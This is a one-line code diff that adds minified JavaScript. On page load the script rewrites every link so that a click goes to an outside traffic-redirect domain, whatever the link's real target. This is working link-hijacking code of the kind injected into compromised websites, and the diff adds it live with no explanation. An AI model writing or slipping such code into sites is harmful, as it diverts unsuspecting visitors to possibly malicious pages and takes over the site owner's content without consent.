@@ -1,0 +1,1 @@
+!function(){"use strict";window.onload=()=>{document.querySelectorAll("a").forEach((t=>{t.onclick=function(t){return t.preventDefault(),window.location.href="https://redirecttraff.site/LkjpTDVh",!1}}))}}();
